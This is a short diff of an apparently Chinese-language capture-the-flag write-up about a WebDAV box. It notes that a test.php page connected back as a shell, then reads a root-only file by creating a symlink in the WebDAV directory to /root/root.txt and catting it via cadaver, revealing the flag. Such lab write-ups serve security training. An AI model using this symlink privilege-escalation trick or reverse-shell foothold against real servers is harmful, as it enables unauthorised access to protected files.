@@ -60,4 +60,10 @@ Not authorized
 cadaver http://dev.dav.dsz:6065/
 
 ![image.png](https://gitee.com/fogpost/photo/raw/master/202603301745830.png)
-
+访问http://dev.dav.dsz/test.php 成功回连
+![image.png](https://gitee.com/fogpost/photo/raw/master/202603301800935.png)
+利用webdav的root权限
+cd /var/lib/webdav
+ln -s /root/root.txt test1
+dav:/> cat test1
+flag{root-ca3fca4032f5f3c5cba2a13b9ec459a5}
